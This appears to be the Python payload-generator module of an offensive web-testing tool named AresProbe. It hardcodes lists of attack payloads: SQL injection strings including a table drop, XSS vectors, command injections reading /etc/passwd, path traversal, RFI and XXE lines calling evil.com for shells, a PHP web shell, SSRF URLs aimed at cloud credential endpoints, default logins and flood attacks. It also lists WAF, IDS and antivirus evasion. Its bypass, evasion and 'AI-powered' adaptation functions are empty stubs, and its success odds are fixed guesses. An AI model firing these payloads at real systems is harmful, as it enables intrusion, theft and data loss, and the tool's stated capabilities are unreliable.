"""
AresProbe Payload Generator
Advanced payload generation for various vulnerability types with AI-powered adaptation
"""

import asyncio
import json
import random
import string
import hashlib
import base64
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import re

from .logger import Logger

class PayloadType(Enum):
    """Types of payloads"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    RCE = "remote_code_execution"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    CSRF = "csrf"
    XXE = "xxe"
    SSRF = "ssrf"
    IDOR = "idor"
    BUSINESS_LOGIC = "business_logic"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    CRYPTOGRAPHIC = "cryptographic"
    NETWORK = "network"
    SYSTEM = "system"

@dataclass
class Payload:
    """Generated payload"""
    payload_type: str
    payload: str
    encoding: str
    bypass_techniques: List[str]
    success_probability: float
    detection_risk: str
    description: str
    examples: List[str]
    evasion_techniques: List[str]

class PayloadGenerator:
    """Advanced payload generator with AI-powered adaptation"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.payload_templates = {}
        self.encoding_methods = {}
        self.bypass_techniques = {}
        self.evasion_techniques = {}
        self.context_adapters = {}
        
        # Initialize components
        self._initialize_payload_templates()
        self._initialize_encoding_methods()
        self._initialize_bypass_techniques()
        self._initialize_evasion_techniques()
        self._initialize_context_adapters()
    
    def _initialize_payload_templates(self):
        """Initialize payload templates"""
        self.payload_templates = {
            PayloadType.SQL_INJECTION: self._get_sql_injection_templates(),
            PayloadType.XSS: self._get_xss_templates(),
            PayloadType.RCE: self._get_rce_templates(),
            PayloadType.LFI: self._get_lfi_templates(),
            PayloadType.RFI: self._get_rfi_templates(),
            PayloadType.CSRF: self._get_csrf_templates(),
            PayloadType.XXE: self._get_xxe_templates(),
            PayloadType.SSRF: self._get_ssrf_templates(),
            PayloadType.IDOR: self._get_idor_templates(),
            PayloadType.BUSINESS_LOGIC: self._get_business_logic_templates(),
            PayloadType.AUTHENTICATION: self._get_authentication_templates(),
            PayloadType.AUTHORIZATION: self._get_authorization_templates(),
            PayloadType.CRYPTOGRAPHIC: self._get_cryptographic_templates(),
            PayloadType.NETWORK: self._get_network_templates(),
            PayloadType.SYSTEM: self._get_system_templates()
        }
    
    def _initialize_encoding_methods(self):
        """Initialize encoding methods"""
        self.encoding_methods = {
            "url": self._url_encode,
            "html": self._html_encode,
            "base64": self._base64_encode,
            "hex": self._hex_encode,
            "unicode": self._unicode_encode,
            "utf8": self._utf8_encode,
            "ascii": self._ascii_encode,
            "binary": self._binary_encode,
            "rot13": self._rot13_encode,
            "caesar": self._caesar_encode
        }
    
    def _initialize_bypass_techniques(self):
        """Initialize bypass techniques"""
        self.bypass_techniques = {
            PayloadType.SQL_INJECTION: [
                "comment_bypass", "case_variation", "whitespace_bypass",
                "encoding_bypass", "function_bypass", "time_delay_bypass"
            ],
            PayloadType.XSS: [
                "filter_bypass", "encoding_bypass", "case_variation",
                "event_handler_bypass", "protocol_bypass", "context_bypass"
            ],
            PayloadType.RCE: [
                "command_bypass", "encoding_bypass", "pipe_bypass",
                "redirect_bypass", "variable_bypass", "function_bypass"
            ],
            PayloadType.LFI: [
                "path_bypass", "encoding_bypass", "null_byte_bypass",
                "double_encoding_bypass", "unicode_bypass", "case_variation"
            ],
            PayloadType.RFI: [
                "url_bypass", "protocol_bypass", "encoding_bypass",
                "dns_bypass", "ip_bypass", "port_bypass"
            ],
            PayloadType.CSRF: [
                "token_bypass", "referer_bypass", "origin_bypass",
                "method_bypass", "header_bypass", "content_type_bypass"
            ],
            PayloadType.XXE: [
                "entity_bypass", "dtd_bypass", "encoding_bypass",
                "protocol_bypass", "file_bypass", "network_bypass"
            ],
            PayloadType.SSRF: [
                "url_bypass", "protocol_bypass", "encoding_bypass",
                "dns_bypass", "ip_bypass", "port_bypass"
            ],
            PayloadType.IDOR: [
                "id_bypass", "parameter_bypass", "encoding_bypass",
                "case_variation", "type_confusion", "race_condition"
            ],
            PayloadType.BUSINESS_LOGIC: [
                "workflow_bypass", "validation_bypass", "state_bypass",
                "timing_bypass", "race_condition", "logic_bypass"
            ],
            PayloadType.AUTHENTICATION: [
                "credential_bypass", "session_bypass", "token_bypass",
                "cookie_bypass", "header_bypass", "parameter_bypass"
            ],
            PayloadType.AUTHORIZATION: [
                "permission_bypass", "role_bypass", "access_bypass",
                "privilege_bypass", "context_bypass", "parameter_bypass"
            ],
            PayloadType.CRYPTOGRAPHIC: [
                "algorithm_bypass", "key_bypass", "implementation_bypass",
                "timing_bypass", "side_channel_bypass", "oracle_bypass"
            ],
            PayloadType.NETWORK: [
                "protocol_bypass", "header_bypass", "packet_bypass",
                "routing_bypass", "firewall_bypass", "ids_bypass"
            ],
            PayloadType.SYSTEM: [
                "syscall_bypass", "privilege_bypass", "sandbox_bypass",
                "aslr_bypass", "dep_bypass", "seccomp_bypass"
            ]
        }
    
    def _initialize_evasion_techniques(self):
        """Initialize evasion techniques"""
        self.evasion_techniques = {
            "waf_evasion": [
                "payload_fragmentation", "encoding_obfuscation", "case_variation",
                "whitespace_manipulation", "comment_injection", "function_substitution"
            ],
            "ids_evasion": [
                "traffic_fragmentation", "timing_manipulation", "protocol_tunneling",
                "encryption_obfuscation", "steganography", "polymorphic_code"
            ],
            "av_evasion": [
                "code_obfuscation", "packing", "encryption", "polymorphism",
                "metamorphism", "steganography"
            ],
            "detection_evasion": [
                "behavioral_mimicry", "legitimate_traffic_mimicry", "noise_injection",
                "timing_manipulation", "resource_limitation", "context_switching"
            ]
        }
    
    def _initialize_context_adapters(self):
        """Initialize context adapters"""
        self.context_adapters = {
            "web_application": self._adapt_web_context,
            "database": self._adapt_database_context,
            "network_service": self._adapt_network_context,
            "system_service": self._adapt_system_context,
            "mobile_application": self._adapt_mobile_context,
            "cloud_service": self._adapt_cloud_context,
            "iot_device": self._adapt_iot_context,
            "embedded_system": self._adapt_embedded_context
        }
    
    async def generate_payload(self, payload_type: str, context: str = "web_application", 
                             target_info: Dict = None, customization: Dict = None) -> Payload:
        """Generate payload for specific vulnerability type"""
        try:
            payload_type_enum = PayloadType(payload_type)
            
            # Get base template
            template = self.payload_templates[payload_type_enum]
            
            # Adapt to context
            if context in self.context_adapters:
                template = await self.context_adapters[context](template, target_info)
            
            # Apply customization
            if customization:
                template = await self._apply_customization(template, customization)
            
            # Generate payload
            payload = await self._generate_from_template(template, payload_type_enum)
            
            # Apply encoding
            encoding = self._select_encoding(payload_type_enum, context)
            encoded_payload = await self._apply_encoding(payload, encoding)
            
            # Apply bypass techniques
            bypass_techniques = self.bypass_techniques.get(payload_type_enum, [])
            bypassed_payload = await self._apply_bypass_techniques(encoded_payload, bypass_techniques)
            
            # Apply evasion techniques
            evasion_techniques = self._select_evasion_techniques(context)
            evaded_payload = await self._apply_evasion_techniques(bypassed_payload, evasion_techniques)
            
            # Calculate success probability
            success_probability = await self._calculate_success_probability(
                payload_type_enum, context, target_info
            )
            
            # Assess detection risk
            detection_risk = await self._assess_detection_risk(
                payload_type_enum, context, evasion_techniques
            )
            
            return Payload(
                payload_type=payload_type,
                payload=evaded_payload,
                encoding=encoding,
                bypass_techniques=bypass_techniques,
                success_probability=success_probability,
                detection_risk=detection_risk,
                description=self._generate_description(payload_type_enum, context),
                examples=self._generate_examples(payload_type_enum, context),
                evasion_techniques=evasion_techniques
            )
            
        except Exception as e:
            self.logger.error(f"[-] Payload generation failed: {e}")
            return Payload(
                payload_type=payload_type,
                payload="",
                encoding="none",
                bypass_techniques=[],
                success_probability=0.0,
                detection_risk="HIGH",
                description="Payload generation failed",
                examples=[],
                evasion_techniques=[]
            )
    
    def _get_sql_injection_templates(self) -> List[str]:
        """Get SQL injection templates"""
        return [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "' OR 1=1--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--",
            "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users')>0--",
            "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
        ]
    
    def _get_xss_templates(self) -> List[str]:
        """Get XSS templates"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ]
    
    def _get_rce_templates(self) -> List[str]:
        """Get RCE templates"""
        return [
            "| whoami",
            "; cat /etc/passwd",
            "&& id",
            "| ls -la",
            "; uname -a",
            "&& pwd",
            "| ps aux",
            "; netstat -an",
            "&& cat /proc/version",
            "| df -h"
        ]
    
    def _get_lfi_templates(self) -> List[str]:
        """Get LFI templates"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "expect://whoami"
        ]
    
    def _get_rfi_templates(self) -> List[str]:
        """Get RFI templates"""
        return [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "ftp://evil.com/shell.txt",
            "file:///etc/passwd",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "php://input",
            "php://filter/read=convert.base64-decode/resource=data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://whoami",
            "glob://*",
            "phar://shell.phar"
        ]
    
    def _get_csrf_templates(self) -> List[str]:
        """Get CSRF templates"""
        return [
            "<form action='http://target.com/action' method='POST'>",
            "<img src='http://target.com/action' width='0' height='0'>",
            "<iframe src='http://target.com/action' style='display:none'></iframe>",
            "<script>fetch('http://target.com/action', {method: 'POST'})</script>",
            "<link rel='stylesheet' href='http://target.com/action'>",
            "<meta http-equiv='refresh' content='0;url=http://target.com/action'>",
            "<object data='http://target.com/action'></object>",
            "<embed src='http://target.com/action'>",
            "<video src='http://target.com/action'></video>",
            "<audio src='http://target.com/action'></audio>"
        ]
    
    def _get_xxe_templates(self) -> List[str]:
        """Get XXE templates"""
        return [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=file:///etc/passwd'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'expect://whoami'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'data://text/plain,<?php system($_GET['cmd']); ?>'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'jar:file:///tmp/shell.jar!/shell.php'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'phar://shell.phar'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'glob://*'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'zip://shell.zip#shell.php'>]><root>&xxe;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'compress.zlib://file:///etc/passwd'>]><root>&xxe;</root>"
        ]
    
    def _get_ssrf_templates(self) -> List[str]:
        """Get SSRF templates"""
        return [
            "http://localhost:22",
            "http://127.0.0.1:22",
            "http://0.0.0.0:22",
            "http://[::1]:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone/"
        ]
    
    def _get_idor_templates(self) -> List[str]:
        """Get IDOR templates"""
        return [
            "?id=1",
            "?user_id=1",
            "?document_id=1",
            "?file_id=1",
            "?order_id=1",
            "?account_id=1",
            "?profile_id=1",
            "?session_id=1",
            "?token=1",
            "?key=1"
        ]
    
    def _get_business_logic_templates(self) -> List[str]:
        """Get business logic templates"""
        return [
            "?price=-100",
            "?quantity=-1",
            "?discount=200",
            "?amount=999999999",
            "?limit=0",
            "?offset=-1",
            "?page=-1",
            "?size=0",
            "?count=-1",
            "?rate=0"
        ]
    
    def _get_authentication_templates(self) -> List[str]:
        """Get authentication templates"""
        return [
            "admin:admin",
            "admin:password",
            "admin:123456",
            "admin:admin123",
            "admin:password123",
            "administrator:administrator",
            "root:root",
            "root:password",
            "root:123456",
            "root:root123"
        ]
    
    def _get_authorization_templates(self) -> List[str]:
        """Get authorization templates"""
        return [
            "?role=admin",
            "?permission=all",
            "?access=full",
            "?level=admin",
            "?type=administrator",
            "?group=admin",
            "?department=admin",
            "?category=admin",
            "?class=admin",
            "?kind=admin"
        ]
    
    def _get_cryptographic_templates(self) -> List[str]:
        """Get cryptographic templates"""
        return [
            "AES-128-ECB",
            "DES",
            "RC4",
            "MD5",
            "SHA1",
            "RSA-1024",
            "DSA-1024",
            "ECDSA-160",
            "DH-1024",
            "ECDH-160"
        ]
    
    def _get_network_templates(self) -> List[str]:
        """Get network templates"""
        return [
            "TCP SYN flood",
            "UDP flood",
            "ICMP flood",
            "HTTP flood",
            "DNS amplification",
            "NTP amplification",
            "SSDP amplification",
            "Memcached amplification",
            "LDAP amplification",
            "MSSQL amplification"
        ]
    
    def _get_system_templates(self) -> List[str]:
        """Get system templates"""
        return [
            "system()",
            "exec()",
            "shell_exec()",
            "passthru()",
            "popen()",
            "proc_open()",
            "eval()",
            "assert()",
            "preg_replace()",
            "create_function()"
        ]
    
    # Encoding methods
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    def _html_encode(self, payload: str) -> str:
        """HTML encode payload"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
    
    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _utf8_encode(self, payload: str) -> str:
        """UTF-8 encode payload"""
        return payload.encode('utf-8').decode('utf-8')
    
    def _ascii_encode(self, payload: str) -> str:
        """ASCII encode payload"""
        return ''.join(f'\\{ord(c):03o}' for c in payload)
    
    def _binary_encode(self, payload: str) -> str:
        """Binary encode payload"""
        return ' '.join(format(ord(c), '08b') for c in payload)
    
    def _rot13_encode(self, payload: str) -> str:
        """ROT13 encode payload"""
        return payload.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
    
    def _caesar_encode(self, payload: str, shift: int = 3) -> str:
        """Caesar cipher encode payload"""
        result = ""
        for char in payload:
            if char.isalpha():
                ascii_offset = 65 if char.isupper() else 97
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        return result
    
    # Context adaptation methods
    async def _adapt_web_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to web application context"""
        # Implementation for web context adaptation
        return template
    
    async def _adapt_database_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to database context"""
        # Implementation for database context adaptation
        return template
    
    async def _adapt_network_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to network service context"""
        # Implementation for network context adaptation
        return template
    
    async def _adapt_system_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to system service context"""
        # Implementation for system context adaptation
        return template
    
    async def _adapt_mobile_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to mobile application context"""
        # Implementation for mobile context adaptation
        return template
    
    async def _adapt_cloud_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to cloud service context"""
        # Implementation for cloud context adaptation
        return template
    
    async def _adapt_iot_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to IoT device context"""
        # Implementation for IoT context adaptation
        return template
    
    async def _adapt_embedded_context(self, template: List[str], target_info: Dict) -> List[str]:
        """Adapt payload to embedded system context"""
        # Implementation for embedded context adaptation
        return template
    
    # Helper methods
    async def _generate_from_template(self, template: List[str], payload_type: PayloadType) -> str:
        """Generate payload from template"""
        return random.choice(template)
    
    def _select_encoding(self, payload_type: PayloadType, context: str) -> str:
        """Select appropriate encoding method"""
        encoding_preferences = {
            PayloadType.SQL_INJECTION: ["url", "hex", "unicode"],
            PayloadType.XSS: ["html", "url", "base64"],
            PayloadType.RCE: ["url", "hex", "base64"],
            PayloadType.LFI: ["url", "hex", "unicode"],
            PayloadType.RFI: ["url", "base64", "hex"],
            PayloadType.CSRF: ["url", "html", "base64"],
            PayloadType.XXE: ["url", "hex", "unicode"],
            PayloadType.SSRF: ["url", "hex", "base64"],
            PayloadType.IDOR: ["url", "hex", "base64"],
            PayloadType.BUSINESS_LOGIC: ["url", "hex", "base64"],
            PayloadType.AUTHENTICATION: ["url", "base64", "hex"],
            PayloadType.AUTHORIZATION: ["url", "hex", "base64"],
            PayloadType.CRYPTOGRAPHIC: ["hex", "base64", "binary"],
            PayloadType.NETWORK: ["hex", "base64", "binary"],
            PayloadType.SYSTEM: ["hex", "base64", "binary"]
        }
        
        preferred_encodings = encoding_preferences.get(payload_type, ["url", "hex", "base64"])
        return random.choice(preferred_encodings)
    
    async def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload"""
        if encoding in self.encoding_methods:
            return self.encoding_methods[encoding](payload)
        return payload
    
    async def _apply_bypass_techniques(self, payload: str, bypass_techniques: List[str]) -> str:
        """Apply bypass techniques to payload"""
        # Implementation for bypass technique application
        return payload
    
    async def _apply_evasion_techniques(self, payload: str, evasion_techniques: List[str]) -> str:
        """Apply evasion techniques to payload"""
        # Implementation for evasion technique application
        return payload
    
    async def _calculate_success_probability(self, payload_type: PayloadType, context: str, target_info: Dict) -> float:
        """Calculate success probability for payload"""
        base_probabilities = {
            PayloadType.SQL_INJECTION: 0.7,
            PayloadType.XSS: 0.8,
            PayloadType.RCE: 0.5,
            PayloadType.LFI: 0.6,
            PayloadType.RFI: 0.4,
            PayloadType.CSRF: 0.7,
            PayloadType.XXE: 0.5,
            PayloadType.SSRF: 0.6,
            PayloadType.IDOR: 0.8,
            PayloadType.BUSINESS_LOGIC: 0.6,
            PayloadType.AUTHENTICATION: 0.5,
            PayloadType.AUTHORIZATION: 0.6,
            PayloadType.CRYPTOGRAPHIC: 0.4,
            PayloadType.NETWORK: 0.5,
            PayloadType.SYSTEM: 0.4
        }
        
        base_probability = base_probabilities.get(payload_type, 0.5)
        
        # Adjust based on context
        context_adjustments = {
            "web_application": 1.0,
            "database": 0.8,
            "network_service": 0.7,
            "system_service": 0.6,
            "mobile_application": 0.8,
            "cloud_service": 0.7,
            "iot_device": 0.6,
            "embedded_system": 0.5
        }
        
        context_adjustment = context_adjustments.get(context, 1.0)
        
        return min(base_probability * context_adjustment, 1.0)
    
    async def _assess_detection_risk(self, payload_type: PayloadType, context: str, evasion_techniques: List[str]) -> str:
        """Assess detection risk for payload"""
        base_risks = {
            PayloadType.SQL_INJECTION: "MEDIUM",
            PayloadType.XSS: "LOW",
            PayloadType.RCE: "HIGH",
            PayloadType.LFI: "MEDIUM",
            PayloadType.RFI: "HIGH",
            PayloadType.CSRF: "LOW",
            PayloadType.XXE: "MEDIUM",
            PayloadType.SSRF: "MEDIUM",
            PayloadType.IDOR: "LOW",
            PayloadType.BUSINESS_LOGIC: "LOW",
            PayloadType.AUTHENTICATION: "MEDIUM",
            PayloadType.AUTHORIZATION: "MEDIUM",
            PayloadType.CRYPTOGRAPHIC: "HIGH",
            PayloadType.NETWORK: "HIGH",
            PayloadType.SYSTEM: "HIGH"
        }
        
        base_risk = base_risks.get(payload_type, "MEDIUM")
        
        # Adjust based on evasion techniques
        if len(evasion_techniques) >= 3:
            if base_risk == "HIGH":
                return "MEDIUM"
            elif base_risk == "MEDIUM":
                return "LOW"
        
        return base_risk
    
    def _generate_description(self, payload_type: PayloadType, context: str) -> str:
        """Generate description for payload"""
        descriptions = {
            PayloadType.SQL_INJECTION: "SQL injection payload for database manipulation",
            PayloadType.XSS: "Cross-site scripting payload for client-side code execution",
            PayloadType.RCE: "Remote code execution payload for system command execution",
            PayloadType.LFI: "Local file inclusion payload for file system access",
            PayloadType.RFI: "Remote file inclusion payload for remote code execution",
            PayloadType.CSRF: "Cross-site request forgery payload for unauthorized actions",
            PayloadType.XXE: "XML external entity payload for file access and SSRF",
            PayloadType.SSRF: "Server-side request forgery payload for internal network access",
            PayloadType.IDOR: "Insecure direct object reference payload for unauthorized data access",
            PayloadType.BUSINESS_LOGIC: "Business logic payload for workflow manipulation",
            PayloadType.AUTHENTICATION: "Authentication bypass payload for unauthorized access",
            PayloadType.AUTHORIZATION: "Authorization bypass payload for privilege escalation",
            PayloadType.CRYPTOGRAPHIC: "Cryptographic payload for encryption/decryption attacks",
            PayloadType.NETWORK: "Network payload for protocol manipulation",
            PayloadType.SYSTEM: "System payload for low-level system access"
        }
        
        return descriptions.get(payload_type, "Generic payload for security testing")
    
    def _generate_examples(self, payload_type: PayloadType, context: str) -> List[str]:
        """Generate examples for payload"""
        examples = {
            PayloadType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT * FROM users--",
                "'; DROP TABLE users;--"
            ],
            PayloadType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            PayloadType.RCE: [
                "| whoami",
                "; cat /etc/passwd",
                "&& id"
            ],
            PayloadType.LFI: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd"
            ],
            PayloadType.RFI: [
                "http://evil.com/shell.txt",
                "https://evil.com/shell.php",
                "ftp://evil.com/shell.txt"
            ],
            PayloadType.CSRF: [
                "<form action='http://target.com/action' method='POST'>",
                "<img src='http://target.com/action' width='0' height='0'>",
                "<iframe src='http://target.com/action' style='display:none'></iframe>"
            ],
            PayloadType.XXE: [
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><root>&xxe;</root>",
                "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=file:///etc/passwd'>]><root>&xxe;</root>"
            ],
            PayloadType.SSRF: [
                "http://localhost:22",
                "http://127.0.0.1:22",
                "http://0.0.0.0:22"
            ],
            PayloadType.IDOR: [
                "?id=1",
                "?user_id=1",
                "?document_id=1"
            ],
            PayloadType.BUSINESS_LOGIC: [
                "?price=-100",
                "?quantity=-1",
                "?discount=200"
            ],
            PayloadType.AUTHENTICATION: [
                "admin:admin",
                "admin:password",
                "admin:123456"
            ],
            PayloadType.AUTHORIZATION: [
                "?role=admin",
                "?permission=all",
                "?access=full"
            ],
            PayloadType.CRYPTOGRAPHIC: [
                "AES-128-ECB",
                "DES",
                "RC4"
            ],
            PayloadType.NETWORK: [
                "TCP SYN flood",
                "UDP flood",
                "ICMP flood"
            ],
            PayloadType.SYSTEM: [
                "system()",
                "exec()",
                "shell_exec()"
            ]
        }
        
        return examples.get(payload_type, ["Generic payload example"])
    
    def _select_evasion_techniques(self, context: str) -> List[str]:
        """Select appropriate evasion techniques"""
        technique_preferences = {
            "web_application": ["waf_evasion", "ids_evasion"],
            "database": ["waf_evasion", "detection_evasion"],
            "network_service": ["ids_evasion", "detection_evasion"],
            "system_service": ["av_evasion", "detection_evasion"],
            "mobile_application": ["av_evasion", "waf_evasion"],
            "cloud_service": ["waf_evasion", "ids_evasion"],
            "iot_device": ["detection_evasion", "av_evasion"],
            "embedded_system": ["detection_evasion", "av_evasion"]
        }
        
        preferred_techniques = technique_preferences.get(context, ["waf_evasion", "ids_evasion"])
        selected_techniques = []
        
        for technique_category in preferred_techniques:
            if technique_category in self.evasion_techniques:
                selected_techniques.extend(random.sample(
                    self.evasion_techniques[technique_category], 
                    min(2, len(self.evasion_techniques[technique_category]))
                ))
        
        return selected_techniques
    
    async def _apply_customization(self, template: List[str], customization: Dict) -> List[str]:
        """Apply customization to template"""
        # Implementation for template customization
        return template
